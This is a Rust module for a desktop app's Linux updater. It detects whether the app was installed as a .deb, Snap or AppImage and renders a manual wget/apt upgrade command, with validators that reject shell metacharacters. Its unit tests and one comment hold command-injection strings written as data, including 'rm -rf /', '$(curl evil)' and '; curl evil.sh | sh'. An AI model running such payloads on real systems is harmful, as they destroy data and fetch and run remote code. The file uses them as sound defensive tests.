// installer_detect.rs — Linux install-method detection for the
// updater UI.
//
// Felipe P2 (2026-05-18): ATO v2.4.8 ran on his WSL2 Ubuntu box for
// six days without realizing v2.7.7 had shipped. He was on the .deb
// from /usr/bin/ato-desktop (root-owned). Tauri's auto-updater tried
// to swap the binary in place and silently failed on EACCES — the
// "Update now" button looked like it did nothing. Snap installs hit
// the same shape (read-only squashfs mount).
//
// This module gives the frontend a way to recognize those installs
// up front and replace the auto-update button with a copy-pasteable
// shell command instead, so the user has *some* path forward when
// the in-process updater can't help.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum InstallMethod {
    Deb,
    AppImage,
    Snap,
    Unknown,
    NonLinux,
}

impl InstallMethod {
    pub fn as_str(self) -> &'static str {
        match self {
            InstallMethod::Deb => "deb",
            InstallMethod::AppImage => "appimage",
            InstallMethod::Snap => "snap",
            InstallMethod::Unknown => "unknown",
            InstallMethod::NonLinux => "nonlinux",
        }
    }
}

/// Detect how the current ato-desktop binary was installed.
///
/// Linux-only signal — macOS/Windows return `NonLinux` because the
/// Tauri updater handles them fine on those platforms (DMG drag-in
/// and MSI/NSIS respectively, both writable by the running user).
///
/// Non-x86_64 Linux returns `Unknown` rather than `Deb`/`Snap` —
/// we only publish x86_64 release assets today, so recommending a
/// hardcoded amd64 URL on an arm64 box would download the wrong
/// architecture and `dpkg -i` would fail with "wrong architecture."
/// Falling through to `Unknown` keeps the existing updater UI in
/// charge for those users (war-room S4 2026-05-20 Q3).
pub fn detect_install_method() -> InstallMethod {
    if !cfg!(target_os = "linux") {
        return InstallMethod::NonLinux;
    }

    // /proc/self/exe is a symlink to the running binary.
    let exe = match std::fs::read_link("/proc/self/exe") {
        Ok(p) => p,
        Err(_) => return InstallMethod::Unknown,
    };
    let exe_str = exe.to_string_lossy().to_string();

    // AppImage exposes APPIMAGE in the child env; also recognise a
    // bare .AppImage suffix in case the user mounted it manually.
    if std::env::var("APPIMAGE").is_ok() || exe_str.to_lowercase().ends_with(".appimage") {
        return InstallMethod::AppImage;
    }

    // We only publish x86_64 .deb / Snap assets right now. On other
    // architectures, recommending the amd64 download URL would point
    // the user at a 404 (or a wrong-arch package). Fall through to
    // Unknown so the regular updater stays in charge.
    let is_x86_64 = std::env::consts::ARCH == "x86_64";

    // Snap mounts the squashfs under /snap/<name>/<rev>/.
    if exe_str.starts_with("/snap/") {
        return if is_x86_64 { InstallMethod::Snap } else { InstallMethod::Unknown };
    }

    // .deb installs land in /usr/bin/ato-desktop and are tracked by
    // dpkg. Both signals must agree before we recommend a dpkg-based
    // upgrade path — a custom build dropped into /usr/bin would be
    // mis-served by our manual-upgrade command.
    if exe_str == "/usr/bin/ato-desktop" && dpkg_owns(&exe_str) {
        return if is_x86_64 { InstallMethod::Deb } else { InstallMethod::Unknown };
    }

    InstallMethod::Unknown
}

fn dpkg_owns(path: &str) -> bool {
    std::process::Command::new("dpkg")
        .arg("-S")
        .arg(path)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Defense-in-depth against a compromised updater manifest: the
/// Tauri updater signs the manifest, but if that signing key ever
/// leaked, a malicious `version` like `2.7.7 && rm -rf /` would
/// otherwise flow straight into the rendered shell command. We
/// require a strict semver-ish shape before interpolation.
fn is_safe_version(v: &str) -> bool {
    if v.is_empty() || v.len() > 64 {
        return false;
    }
    v.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '+')
}

/// Same idea for the release URL — it comes from a signed manifest
/// (or our own URL builder) but we still reject anything containing
/// shell metacharacters or whitespace before interpolation.
fn is_safe_release_url(u: &str) -> bool {
    if u.is_empty() || u.len() > 2048 {
        return false;
    }
    if !(u.starts_with("https://") || u.starts_with("http://")) {
        return false;
    }
    !u.chars().any(|c| {
        c.is_whitespace()
            || matches!(
                c,
                '`' | '$'
                    | '"'
                    | '\''
                    | '\\'
                    | ';'
                    | '|'
                    | '&'
                    | '>'
                    | '<'
                    | '('
                    | ')'
                    | '{'
                    | '}'
                    // Glob chars too: zsh's default failglob makes any
                    // unmatched glob in an argument a hard error, and
                    // bash can silently expand to a local-file match
                    // that changes wget's argument out from under us.
                    // Signed manifest URLs never legitimately contain
                    // these.
                    | '*'
                    | '?'
                    | '['
                    | ']'
            )
    })
}

/// Render the shell command a user should run to upgrade out-of-band
/// when the in-process updater can't help. `None` means "no manual
/// path — fall through to whatever the regular updater UI does."
///
/// `release_url` should be the direct download URL for the new
/// platform-specific bundle (e.g. the .deb asset for the new
/// version). The caller resolves it from the Tauri updater manifest.
///
/// `apt install ./local.deb` (not `dpkg -i`, and not `dpkg -r`
/// first) is the chosen .deb shape: apt resolves dependencies that
/// raw dpkg would leave dangling, and skipping the `dpkg -r` step
/// means a failed `wget` doesn't leave the user with nothing
/// installed at all — Felipe's WSL2 box on a flaky network would
/// otherwise have come out of the upgrade worse than it went in
/// (war-room S4 2026-05-20 Q5).
pub fn manual_update_command(
    method: InstallMethod,
    version: &str,
    release_url: &str,
) -> Option<String> {
    if !is_safe_version(version) {
        return None;
    }
    match method {
        InstallMethod::Deb => {
            if !is_safe_release_url(release_url) {
                return None;
            }
            Some(format!(
                "wget {} -O /tmp/ato.deb && sudo apt install -y /tmp/ato.deb",
                release_url
            ))
        }
        InstallMethod::Snap => Some("sudo snap refresh ato".to_string()),
        InstallMethod::AppImage | InstallMethod::Unknown | InstallMethod::NonLinux => None,
    }
}

#[tauri::command]
pub fn get_install_method() -> Result<String, String> {
    Ok(detect_install_method().as_str().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(target_os = "macos")]
    fn detect_returns_nonlinux_on_macos() {
        assert_eq!(detect_install_method(), InstallMethod::NonLinux);
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn detect_returns_nonlinux_on_windows() {
        assert_eq!(detect_install_method(), InstallMethod::NonLinux);
    }

    #[test]
    fn manual_command_for_deb_uses_apt_install_with_release_url() {
        let cmd = manual_update_command(
            InstallMethod::Deb,
            "2.7.7",
            "https://example.com/ATO_2.7.7_amd64.deb",
        )
        .expect("Deb should produce a manual command");
        assert_eq!(
            cmd,
            "wget https://example.com/ATO_2.7.7_amd64.deb -O /tmp/ato.deb && sudo apt install -y /tmp/ato.deb"
        );
    }

    #[test]
    fn manual_command_for_snap_is_snap_refresh() {
        let cmd = manual_update_command(InstallMethod::Snap, "2.7.7", "ignored")
            .expect("Snap should produce a manual command");
        assert_eq!(cmd, "sudo snap refresh ato");
    }

    #[test]
    fn manual_command_none_for_appimage_unknown_nonlinux() {
        let url = "https://example.com/x.deb";
        assert!(manual_update_command(InstallMethod::AppImage, "2.7.7", url).is_none());
        assert!(manual_update_command(InstallMethod::Unknown, "2.7.7", url).is_none());
        assert!(manual_update_command(InstallMethod::NonLinux, "2.7.7", url).is_none());
    }

    #[test]
    fn manual_command_rejects_unsafe_versions() {
        // Newline injection — a compromised manifest could otherwise
        // chain a second shell command after the wget URL.
        assert!(manual_update_command(
            InstallMethod::Deb,
            "2.7.7\n && rm -rf /",
            "https://example.com/x.deb",
        )
        .is_none());
        // Backtick / $() command substitution.
        assert!(manual_update_command(
            InstallMethod::Deb,
            "2.7.7`rm -rf /`",
            "https://example.com/x.deb",
        )
        .is_none());
        assert!(manual_update_command(
            InstallMethod::Deb,
            "$(curl evil)",
            "https://example.com/x.deb",
        )
        .is_none());
        // Empty version is rejected.
        assert!(
            manual_update_command(InstallMethod::Deb, "", "https://example.com/x.deb").is_none()
        );
    }

    #[test]
    fn manual_command_rejects_unsafe_release_url() {
        // Shell metacharacters in the URL would break out of the
        // wget arg and start a new command.
        assert!(manual_update_command(
            InstallMethod::Deb,
            "2.7.7",
            "https://example.com/x.deb; curl evil.sh | sh",
        )
        .is_none());
        // Non-http(s) schemes — file://, javascript:, etc.
        assert!(
            manual_update_command(InstallMethod::Deb, "2.7.7", "file:///etc/passwd").is_none()
        );
        // Snap doesn't read the URL, so a bad URL is still allowed
        // there (the command is hardcoded).
        assert!(manual_update_command(
            InstallMethod::Snap,
            "2.7.7",
            "https://example.com/x.deb; rm -rf /",
        )
        .is_some());
    }

    #[test]
    fn enum_serializes_as_lowercase() {
        assert_eq!(InstallMethod::Deb.as_str(), "deb");
        assert_eq!(InstallMethod::AppImage.as_str(), "appimage");
        assert_eq!(InstallMethod::Snap.as_str(), "snap");
        assert_eq!(InstallMethod::Unknown.as_str(), "unknown");
        assert_eq!(InstallMethod::NonLinux.as_str(), "nonlinux");
    }
}
